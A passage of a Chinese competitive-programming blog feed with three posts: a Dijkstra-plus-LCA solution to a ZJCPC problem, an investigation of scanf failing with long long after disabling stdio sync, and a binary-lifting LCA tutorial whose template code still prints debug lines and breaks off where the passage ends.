cin&gt;&gt;x&gt;&gt;y;</span><br><span class="line">    <span class="keyword">int</span> lca=<span class="built_in">LCA</span>(x,y);<span class="comment">//先求最近公共祖先</span></span><br><span class="line">    <span class="keyword">int</span> lx=<span class="built_in">cal_c</span>(x,lca),ly=<span class="built_in">cal_c</span>(y,lca);<span class="comment">//算出他们在那个点的第几个祖先</span></span><br><span class="line">    <span class="keyword">int</span> ans=INF;</span><br><span class="line">    <span class="keyword">while</span>(lca)&#123;</span><br><span class="line">        ans=<span class="built_in">min</span>(ans,dis[x][lx]+dis[y][ly]);<span class="comment">//寻找最小值</span></span><br><span class="line">        lx++,ly++;<span class="comment">//每次往上看看那个祖先</span></span><br><span class="line">        lca&gt;&gt;=<span class="number">1</span>;<span class="comment">//完全二叉树怎么找自己的父亲，这个不难吧？</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(ans==INF)<span class="built_in">printf</span>(<span class="string">&quot;-1\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);<span class="comment">//输出答案</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重要的部分写完了之后那么整个程序就呼之欲出了，但是一定得注意，不开 $long long$ 见祖宗哦。</p><p>然后还有一点就是，既然你开了 $long long$ 一定不要忘了 $inf$ ，不要漏写一半，不然真到比赛要么哭罚时，要么哭整整一题了，不管前者后者，都是很伤的，建议先记在心里。</p><p>标程</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 100005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INF 0x3f3f3f3f3f3f3f3f</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; P;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> next;</span><br><span class="line"><span class="keyword">int</span> to;</span><br><span class="line"><span class="keyword">int</span> w;</span><br><span class="line">&#125;edge[maxn&lt;&lt;<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> head[maxn],dis[maxn][<span class="number">30</span>],cnt,n,m;</span><br><span class="line"><span class="keyword">int</span> vis1[maxn];</span><br><span class="line"><span class="keyword">int</span> vis2[maxn];</span><br><span class="line"><span class="keyword">int</span> d[maxn];</span><br><span class="line">priority_queue&lt;P,vector&lt;P&gt;,greater&lt;P&gt; &gt; p;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cal_c</span><span class="params">(<span class="keyword">int</span> child,<span class="keyword">int</span> ancestor)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(child&gt;ancestor)&#123;</span><br><span class="line">cnt++;</span><br><span class="line">child&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> cnt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> w)</span></span>&#123;</span><br><span class="line">edge[++cnt].next=head[x];</span><br><span class="line">edge[cnt].to=y;</span><br><span class="line">edge[cnt].w=w;</span><br><span class="line">head[x]=cnt;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dijkstra</span><span class="params">(<span class="keyword">int</span> root)</span></span>&#123;</span><br><span class="line">p.<span class="built_in">push</span>(&#123;<span class="number">0</span>,root&#125;);</span><br><span class="line">d[root]=<span class="number">0</span>;</span><br><span class="line">vis2[root]=root;</span><br><span class="line"><span class="keyword">while</span>(!p.<span class="built_in">empty</span>())&#123;</span><br><span class="line"><span class="keyword">auto</span> x=p.<span class="built_in">top</span>();</span><br><span class="line">p.<span class="built_in">pop</span>();</span><br><span class="line"><span class="keyword">int</span> point=x.second;</span><br><span class="line"><span class="keyword">if</span>(vis1[point]==root)<span class="keyword">continue</span>;</span><br><span class="line">vis1[point]=root;</span><br><span class="line">dis[point][<span class="built_in">cal_c</span>(point,root)]=d[point];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=head[point];i;i=edge[i].next)&#123;</span><br><span class="line"><span class="keyword">int</span> to=edge[i].to;</span><br><span class="line"><span class="keyword">if</span>(to&lt;root)<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(vis2[to]!=root)&#123;</span><br><span class="line">d[to]=INF;</span><br><span class="line">vis2[to]=root;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span>(d[point]+edge[i].w&lt;d[to])&#123;</span><br><span class="line">d[to]=d[point]+edge[i].w;</span><br><span class="line">p.<span class="built_in">push</span>(&#123;d[to],to&#125;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LCA</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">while</span>(a!=b)&#123;</span><br><span class="line"><span class="keyword">if</span>(a&gt;b)a&gt;&gt;=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">else</span> b&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//freopen(&quot;1.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line"><span class="keyword">int</span> x,y,w;</span><br><span class="line">cin&gt;&gt;x&gt;&gt;y&gt;&gt;w;</span><br><span class="line"><span class="built_in">add</span>(x,y,w);</span><br><span class="line"><span class="built_in">add</span>(y,x,w);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(dis,<span class="number">0x3f</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(dis)); </span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="built_in">dijkstra</span>(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> q;</span><br><span class="line">cin&gt;&gt;q;</span><br><span class="line"><span class="keyword">while</span>(q--)&#123;</span><br><span class="line"><span class="keyword">int</span> x,y;</span><br><span class="line">cin&gt;&gt;x&gt;&gt;y;</span><br><span class="line"><span class="keyword">int</span> lca=<span class="built_in">LCA</span>(x,y);</span><br><span class="line"><span class="keyword">int</span> lx=<span class="built_in">cal_c</span>(x,lca),ly=<span class="built_in">cal_c</span>(y,lca);</span><br><span class="line"><span class="keyword">int</span> ans=INF;</span><br><span class="line"><span class="keyword">while</span>(lca)&#123;</span><br><span class="line">ans=<span class="built_in">min</span>(ans,dis[x][lx]+dis[y][ly]);</span><br><span class="line">lx++,ly++;</span><br><span class="line">lca&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(ans==INF)<span class="built_in">printf</span>(<span class="string">&quot;-1\n&quot;</span>);</span><br><span class="line"><span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>蒟蒻的提交记录。</p><p><a href="https://codeforces.com/gym/103055/problem/D">测评网站</a></p><p><img src="/2022/02/13/ZJCPC-D%E9%A2%98%E9%A2%98%E8%A7%A3/4.png" alt="8"></p><p>至于踩的那几个坑嘛，就是 $long long$ 的问题了，然后还有一点就是输入的问题，这个具体看我上一篇博客吧，我到现在还没太弄懂，不过至少能注意规避的技巧了：那就是千万别在开</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br></pre></td></tr></table></figure><p>的情况下用 $scanf$ 去读取 $long long$ 数据，不然你会怀疑人生。</p><p>希望这次省赛能超越上次的自己吧，$xia0ji233,fighting！！！$</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;今天来复盘一下上次省赛考到的题目，异常地折磨人。&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="图论" scheme="http://example.com/categories/icpc/%E5%9B%BE%E8%AE%BA/"/>
    
    <category term="LCA" scheme="http://example.com/categories/icpc/%E5%9B%BE%E8%AE%BA/LCA/"/>
    
    <category term="最短路径" scheme="http://example.com/categories/icpc/%E5%9B%BE%E8%AE%BA/%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84/"/>
    
    
  </entry>
  
  <entry>
    <title>C++文件的输入输出问题</title>
    <link href="http://example.com/2022/02/13/%E5%85%B3%E4%BA%8EC++%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%9A%84%E9%97%AE%E9%A2%98/"/>
    <id>http://example.com/2022/02/13/%E5%85%B3%E4%BA%8EC++%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%9A%84%E9%97%AE%E9%A2%98/</id>
    <published>2022-02-12T17:00:00.000Z</published>
    <updated>2022-02-12T19:33:01.589Z</updated>
    
    <content type="html"><![CDATA[<p>今天写这篇博客纯粹就是遇到点问题，不知道有没有人遇到过。</p><span id="more"></span><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>最近打CF的时候发现交上去一个答案发生了非预期退出，而且是在样例里面发生的，于是我赶紧把程序扒下来最大限度地确定出现问题的代码段，最终出现了以下代码写的程序。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> q;</span><br><span class="line">cin&gt;&gt;q;</span><br><span class="line"><span class="keyword">while</span>(q--)&#123;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> s,t;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%lld %lld&quot;</span>,&amp;s,&amp;t);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;s=%lld t=%lld\n&quot;</span>,s,t); </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先万能头文件，然后我打开了一个文件把标准输入流重定向到一个文件中，并且关闭了 $cin$ 和 $cout$ 的同步流，大概率问题是出在这里的，然后就一些常规操作没什么好说的。</p><p>我的 $1.in$ 的文件内容如下图所示：</p><p><img src="/2022/02/13/%E5%85%B3%E4%BA%8EC++%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%9A%84%E9%97%AE%E9%A2%98/1.png" alt="1"></p><p>是正常的输入数据，并且文件编码为 $UTF-8$ 没有任何问题。</p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>那么我们开 $DEV$ 运行以下先。</p><p><img src="/2022/02/13/%E5%85%B3%E4%BA%8EC++%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%9A%84%E9%97%AE%E9%A2%98/2.png" alt="2"></p><p>可以看到程序运行出现了非预期结果。</p><p>由于 $DEV$ 不方便调试我们便把 $IDE$ 换成了 $VScode$ 。</p><p>这里我们在 $scanf$ 和 $printf$ 分别打一个断点，然后开启调试模式。</p><p><img src="/2022/02/13/%E5%85%B3%E4%BA%8EC++%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%9A%84%E9%97%AE%E9%A2%98/3.png" alt="3"></p><p>这里 $s$ 和 $t$ 是随机值正常，因为我们并没有初始化 $s$ 和 $t$ 。</p><p>那么我们 $F10$ 步过看看结果。</p><p><img src="/2022/02/13/%E5%85%B3%E4%BA%8EC++%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%9A%84%E9%97%AE%E9%A2%98/4.png" alt="4"></p><p>过了 $scanf$ 却没有成功读入数据！！！这是为什么？</p><p>我开始尝试找不同的原因，原因1就是怀疑文件读入的问题，所以我们先注释重定向那一行测试看看。</p><p><img src="/2022/02/13/%E5%85%B3%E4%BA%8EC++%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%9A%84%E9%97%AE%E9%A2%98/5.png" alt="5"></p><p>运行结果是正常的，这么看来问题似乎解决了。</p><p>但是提交给oj是实实在在地报错了，因此我们尝试注释其它代码看看情况，这里我们接着选择注释这个关闭同步流的代码。</p><p><img src="/2022/02/13/%E5%85%B3%E4%BA%8EC++%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%9A%84%E9%97%AE%E9%A2%98/6.png" alt="6"></p><p>这回居然正常读入了数据！什么鬼？</p><p>因为刚刚我把 $freopen$ 注释了是确确实实读入没有什么问题了，但是现在似乎把</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br></pre></td></tr></table></figure><p>给关闭了程序也是能正常进行的。</p><p>而且这里我还测试了第三种情况：两者都打开，把 $long long$ 换回 $int$ 类型。</p><p><img src="/2022/02/13/%E5%85%B3%E4%BA%8EC++%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E7%9A%84%E9%97%AE%E9%A2%98/7.png" alt="7"></p><p>居然也是正常读入？也就是说，打开文件，在关闭同步流的情况下使用 $scanf$ 读入 $long long$ 数据类型会导致读入不成功，而且注释了打开文件提交给 oj 测评返回了错误结果。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>我个人感觉可能涉及到底层的一些问题了。因为自己测试确实三种情况同时满足会导致读入数据失败。这三种情况分别是</p><ol><li>重定向 $stdin$ 到一个文件</li><li>关闭IO同步流</li><li>用 $scanf$ 读入 $long long$ 数据</li></ol><p>一般来说，$scanf$ 不接收到 $EOF$ 信号是会一直等待你输入的。常见的 $EOF$ 基本就是读到文件尾，或者手动给终端了一个 $Ctrl + Z$ 信号给程序，这应该算外部中断了。就基本不会遇到 $scanf$ 读入失败的情况。要真的能有这么好数据那不是可以随便泄露？如果上一个栈帧保存的一些变量的地址刚好在这，我这里故意读入失败那就直接泄露地址，我没见过这样的情况。</p><p>当然我比较浅薄，只能看到表面上的一些东西，如果你有深层次点的合理的解释麻烦你也联系我，我也不想就在这里留一个错误的结论，期待这个问题能早点解决。</p><p>下面我也给出以下本次实验用到的<a href="broken.zip">附件</a>供大家测试，看看能不能是版本的问题。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;今天写这篇博客纯粹就是遇到点问题，不知道有没有人遇到过。&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="stdin" scheme="http://example.com/categories/icpc/stdin/"/>
    
    <category term="stdout" scheme="http://example.com/categories/icpc/stdin/stdout/"/>
    
    
  </entry>
  
  <entry>
    <title>最近公共祖先求解</title>
    <link href="http://example.com/2022/02/11/LCA%E8%AF%A6%E8%A7%A3/"/>
    <id>http://example.com/2022/02/11/LCA%E8%AF%A6%E8%A7%A3/</id>
    <published>2022-02-11T15:00:00.000Z</published>
    <updated>2022-02-11T15:16:06.007Z</updated>
    
    <content type="html"><![CDATA[<p>最近来复习一遍图论的板子——LCA。</p><span id="more"></span><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p><strong>最近公共祖先</strong>（英语：lowest common ancestor）是指在一个<a href="https://zh.wikipedia.org/wiki/%E6%A0%91_(%E5%9B%BE%E8%AE%BA)">树</a>或者<a href="https://zh.wikipedia.org/wiki/%E6%9C%89%E5%90%91%E6%97%A0%E7%8E%AF%E5%9B%BE">有向无环图</a>中同时拥有<em>v</em>和<em>w</em>作为后代的最深的节点。在这里，我们定义一个节点也是其自己的后代，因此如果<em>v</em>是<em>w</em>的后代，那么<em>w</em>就是<em>v</em>和<em>w</em>的最近公共祖先。(fron wiki)</p><h3 id="算法设计"><a href="#算法设计" class="headerlink" title="算法设计"></a>算法设计</h3><p>我们先来看看应该怎么解决此类问题。</p><h4 id="一般思路"><a href="#一般思路" class="headerlink" title="一般思路"></a>一般思路</h4><p>在一个树上，我们定义离根节点最远的与a,b相同的祖先为最近公共祖先(LCA)。我们需要怎么做呢，首先肯定是 dfs 跑一遍，把所有的点的层次遍历出来，时间复杂度为 $O(N)$。一般情况下 $LCA$ 问题会有多次询问，询问次数一般为 $q&lt;10^5$ ，那么就意味着我们不能在线性时间内去计算 $LCA$，如果采取最朴素的方法：选定2个点，若深度不一样则先转为深度一样，深度较深的点不停求它的父亲节点直到深度一样，然后用如下代码去求解。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LCA</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">while</span>(a!=b)&#123;</span><br><span class="line">a=pre[a];</span><br><span class="line">b=pre[b];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样当然可以，而且非常符合最近公共祖先的定义，只是只需要稍微构造一下数据就可以 $T$ 到飞起。</p><h4 id="正确思路"><a href="#正确思路" class="headerlink" title="正确思路"></a>正确思路</h4><p>有一点不难发现：如果我和你有一个公共祖先，则公共祖先的祖先一定也是我们的公共祖先。比如亲兄弟之间，它们的公共祖先就是它们的父母（这里我们假设父母是一个人，爷爷奶奶姥姥姥爷等也是一个人），父母的祖先也就是爷爷奶奶它们同样也是这亲兄弟的公共祖先。再有一个，如果我们两个人的父亲不相同，则我们的公共祖先也等于我们父亲之间的公共祖先，这个都是能直接得到的结论。那么它在一定意义上是有序的，我们就可以采用倍增+二分的思路。</p><p>假设 $fa[a][k]$ 为差 $a$ 点 $2^k$ 辈的祖先，$fa[a][0]$ 就表示 $a$ 的父亲。在搜索的时候我们先观察节点所在的深度然后取得离他们最远的公共祖先。也就是 $fa[a][log_2deep[a]]$ </p><p>但是你可能会发现，如果深度为7，那么它最多只能往上找 $4$ 个祖先，而如果公共祖先刚好是根节点，那么怎么办呢？那么我们不选择缩小区间，而是把 $a,b$ 当成新的对象来算公共祖先。那你有会发现，如果再往上找4个，那么会没有这个值，那怎么办呢？其实我们不需要它有，我们只需要它相等即可。因为根节点一定是所有节点之间的公共祖先，所以我们直接就这么找，找到相等区间往里面缩小一半，就往上找2个祖先，这时候可以发现刚好在根节点之前，如果它们的最近公共祖先是根节点，那么同理，这次寻找又会往上再找两个祖先。又跑到了根节点之外，判断相等，区间缩小为1。区间缩小为1的时候退出循环，此时我们要找的最近公共祖先就在当前点的父亲节点。</p><p>不知道这是否能解决你在运用倍增法求 $LCA$ 的疑惑。</p><p>可以看到每次以树的高度为范围，区间缩小一半地求，效率是非常高的。求一次 $LCA$ 的时间复杂度仅仅为 $log_2n$。</p><h2 id="题目练手"><a href="#题目练手" class="headerlink" title="题目练手"></a>题目练手</h2><p><a href="https://www.luogu.com.cn/problem/P3379">洛谷P3379</a> </p><p>标版，直接打就完事了。这里需要注意一下，如果深度不一样那么先平衡深度这个操作，这个操作我们并不是也要一个一个平衡的，也可以用倍增的思路。我先算出两深度之差，把差拆分为二进制比特位，如果从第往高第 $i$ 位为 $1$，那么我就往前寻找 $2^i$ 个祖先，而从当前点往前寻找 $2^i$ 个祖先我们可以直接用 $fa[now][i]$ 来快速求得。如果它构造特殊数据，那么直接一位一位往前寻找平衡深度可能会导致超时。</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 500005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> to;</span><br><span class="line"><span class="keyword">int</span> next;</span><br><span class="line">&#125;edge[maxn&lt;&lt;<span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> root[maxn],cnt,lg[maxn],n,q,s;</span><br><span class="line"><span class="keyword">int</span> fa[maxn][<span class="number">25</span>],depth[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">edge[++cnt].to=y;</span><br><span class="line">edge[cnt].next=root[x];</span><br><span class="line">root[x]=cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> now,<span class="keyword">int</span> p)</span></span>&#123;</span><br><span class="line">fa[now][<span class="number">0</span>]=p;</span><br><span class="line">depth[now]=depth[p]+<span class="number">1</span>;</span><br><span class="line"><span class="comment">//printf(&quot;point=%d deep=%d\n&quot;,now,depth[now]);</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=lg[depth[now]];i++)&#123;</span><br><span class="line">fa[now][i]=fa[fa[now][i<span class="number">-1</span>]][i<span class="number">-1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=root[now];i;i=edge[i].next)&#123;</span><br><span class="line"><span class="keyword">int</span> to=edge[i].to;</span><br><span class="line"><span class="keyword">if</span>(to!=p)</span><br><span class="line"><span class="built_in">dfs</span>(to,now);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">LCA</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(depth[a]&gt;depth[b])&#123;</span><br><span class="line"><span class="built_in">swap</span>(a,b);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> x=depth[b]-depth[a];</span><br><span class="line"><span class="keyword">int</span> k=<span class="number">0</span>;</span><br><span class="line"><span class="comment">//printf(&quot;a=%d,b=%d\n&quot;,a,b);</span></span><br><span class="line"><span class="keyword">while</span>(x)&#123;</span><br><span class="line"><span class="keyword">if</span>(x&amp;<span class="number">1</span>)&#123;</span><br><span class="line">b=fa[b][k];</span><br><span class="line">&#125;</span><br><span class="line">k++;</span><br><span class="line">x&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//printf(&quot;deep=%d\n&quot;,depth[b]);</span></span><br><span class="line">k=lg[depth[a]];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;a=%d,b=%d\n&quot;</span>,a,b);</span><br><span class="line"><span class="keyword">while</span>(k!=<span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;k=%d\n&quot;</span>,k);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;a=%d,b=%d\n&quot;</span>,fa[a][k],fa[b][k]);</span><br><span class="line"><span class="keyword">if</span>(fa[a][k]==fa[b][k])k--;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">a=fa[a][k];</span><br><span class="line">b=fa[b][k];</span><br><span class="line"><span class="comment">//k=lg[depth[a]];</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(a==b)<span class="keyword">return</span> a;</span><br><span class="line"><span class="keyword">else</span> <span 